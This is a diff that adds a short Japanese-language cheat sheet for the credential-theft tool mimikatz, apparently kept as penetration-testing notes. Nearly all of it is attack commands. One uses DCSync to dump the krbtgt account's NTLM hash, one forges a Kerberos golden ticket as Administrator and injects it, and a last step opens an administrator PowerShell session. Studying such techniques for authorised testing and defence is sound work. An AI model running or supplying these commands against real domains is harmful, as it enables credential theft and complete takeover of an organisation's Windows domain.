@@ -1,0 +1,10 @@
+＃横展開、権限昇格によく使われる。ケルベロス攻撃にも活用できる
+
+#使い方
+.\mimikatz.exe #mimikatzのコマンドラインが起動する
+
+#ケルベロス関連
+lsadump::dcsync /user:krbtgt /domain:<domain> #krbtgtのNTLMハッシュを入手
+kerberos::golden /domain:<domain> /user:Administrator /sid:<sid> /rc4:<ntlm hash> /ptt #ゴールデンチケットの偽造　successが出たら成功。exitする
+Enter-PSSessionでadminのpowershellが始まる
+
